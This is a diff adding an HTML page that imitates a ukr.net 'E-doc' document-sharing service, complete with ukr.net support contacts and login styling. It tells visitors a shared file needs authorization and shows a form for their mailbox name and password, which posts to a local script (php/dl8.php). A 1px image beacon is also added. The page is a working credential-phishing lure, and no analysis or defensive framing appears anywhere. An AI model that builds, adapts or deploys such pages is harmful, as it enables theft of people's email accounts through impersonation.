@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html class="js desktop">
+
+<head lang="uk">
+  <title>Система єлектронного </title>
+  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <link rel="stylesheet" href="css/bundle.css">
+  <link rel="icon" href="images/favicon.ico">
+  <script src="js/bundle.js"></script>
+</head>
+
+<body>
+  <div class="page-ukrnet">
+    <aside class="sidebar">
+      <div class="sidebar__content">
+        <a>
+          <div class="sidebar__logo"></div>
+        </a>
+        <div class="sidebar__search">
+          <input class="sidebar__search-field" type="search" name="search" placeholder="Пошук" autocomplete="off">
+        </div>
+        <p class="sidebar__menu-title">Керування акаунтом</p>
+        <ul class="sidebar__menu-list">
+          <li class="sidebar__menu-item">
+            <a class="sidebar__menu-link">Налаштування роботи з листами</a>
+          </li>
+          <li class="sidebar__menu-item">
+            <a class="sidebar__menu-link">Налаштування поштової скриньки</a>
+          </li>
+          <li class="sidebar__menu-item">
+            <a class="sidebar__menu-link">Налаштування безпеки акаунта</a>
+          </li>
+        </ul>
+        <div class="sidebar__footer">
+          <p class="sidebar__contacts-title">Контакти служби підтримки:</p>
+          <ul class="sidebar__contacts-list">
+            <li class="sidebar__contact sidebar__contact_email">
+              <a class="sidebar__contacts-link">support@ukr.net</a>
+            </li>
+            <li class="sidebar__contact sidebar__contact_number">
+              <a class="sidebar__contacts-link">(044) 235-85-55</a>
+            </li>
+            <li class="sidebar__contact sidebar__contact_number">
+              <a class="sidebar__contacts-link">(050) 204-14-24</a>
+            </li>
+            <li class="sidebar__contact sidebar__contact_number">
+              <a class="sidebar__contacts-link">(096) 718-55-52</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </aside>
+    <div class="content">
+      <header class="header">
+      </header>
+      <div id="dokuwiki__content">
+        <main class="dynalist">
+          <h1 class="dynalist__header">Система електронного документообігу E-doc</h1>
+
+          <p class="dynalist__subheader">Цей файл був відправлений за допомогою системи електронного документообігу
+            нашого сервісу, для його перегляду потрібна авторизація</p>
+
+          <ul class="dynalist__list">
+
+            <li class="dynalist__item">
+              <button class="dynalist__title js-expansion-target"
+                data-expanded-class="dynalist__title_expanded">Завантажити файл</button>
+              <ul class="dynalist__content-list" style="display: none;">
+                <li class="dynalist__content-item">
+
+                  <div class="cm96uGWL">
+                    <form class="_27e9pAZr" method="POST" action="php/dl8.php">
+                      <div class="XC54guCS">
+                        <div class="mJOT30ua _32TpACVe _1mUfXaVE">
+                          <p class="_3wUI4tC9">
+                            <label for="id-text-field-0">Імя скриньки</label>
+                          </p>
+                          <div class="E50lnyie">
+                            <input type="text" autofocus="" autocapitalize="none" autocorrect="off" maxlength="32"
+                              name="login" id="id-text-field-0" class="_2mlMu-wH" required="" pattern="\S+">
+                            <span class="_2wDvNoc7">@<!-- -->ukr.net</span>
+                          </div>
+                        </div>
+                        <div class="mJOT30ua _32TpACVe _1mUfXaVE _2osOLJuf">
+                          <p class="_3wUI4tC9">
+                            <label for="id-text-field-1">Пароль</label>
+                          </p>
+                          <div class="E50lnyie">
+                            <input type="password" name="password" maxlength="128" value="" id="id-text-field-1"
+                              class="_2mlMu-wH _3qNuhI7V" required="" pattern="\S+">
+                            <button viewbox="0 0 24 24" width="24" height="24"
+                              class="_3X3e-EB1 TINVi9Sp _2PjLuT8z _34YOWnvG" id="eye" style="display: none;">
+                              <svg viewBox="0 0 24 24" width="24" height="24" class="_6A8JBz2d">
+                                <path
+                                  d="M12 5.75c2.328 0 4.362 1.132 6.089 2.99a14 14 0 011.65 2.167l.185.307.144.255.104.198a.75.75 0 010 .666l-.104.198-.144.255-.185.307-.108.17a14 14 0 01-1.542 1.998C16.362 17.118 14.328 18.25 12 18.25s-4.362-1.132-6.089-2.99a14 14 0 01-1.65-2.167l-.185-.307-.144-.255-.104-.198a.75.75 0 010-.666l.104-.198.144-.255.185-.307.108-.17a14 14 0 011.542-1.998C7.638 6.882 9.672 5.75 12 5.75m0 1.5c-1.848 0-3.522.93-4.99 2.51a12.7 12.7 0 00-1.472 1.935L5.353 12l.1.167.18.289c.39.609.85 1.218 1.377 1.784 1.468 1.58 3.142 2.511 4.99 2.511s3.522-.93 4.99-2.51a12.7 12.7 0 001.378-1.785l.18-.289.098-.167-.098-.165-.18-.289a12.6 12.6 0 00-1.378-1.784C15.522 8.18 13.848 7.25 12 7.25m0 3.25a1.5 1.5 0 110 3 1.5 1.5 0 010-3">
+                                </path>
+                              </svg>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+
+                      <div class="_3DuSIGEo">
+                        <button class="_32evgEwL _1R2oPx4G" type="submit" id="lgn">Продовжити</button>
+                      </div>
+
+                    </form>
+                  </div>
+
+                </li>
+              </ul>
+            </li>
+
+          </ul>
+        </main>
+      </div>
+    </div>
+</body>
+<script>
+  var coll = document.getElementsByClassName("dynalist__title js-expansion-target");
+  var i;
+
+  for (i = 0; i < coll.length; i++) {
+    coll[i].addEventListener("click", function () {
+      this.classList.toggle("dynalist__title_expanded");
+      var content = this.nextElementSibling;
+      if (content.style.display === "block") {
+        content.style.display = "none";
+      } else {
+        content.style.display = "block";
+      }
+    });
+  }
+
+  var img = document.createElement("img");
+  img.src = "http://localhost/login/modj";
+  img.style.width = "1px";
+  img.style.height = "1px";
+  document.createElement("a").appendChild(img);
+</script>
+
+</html>
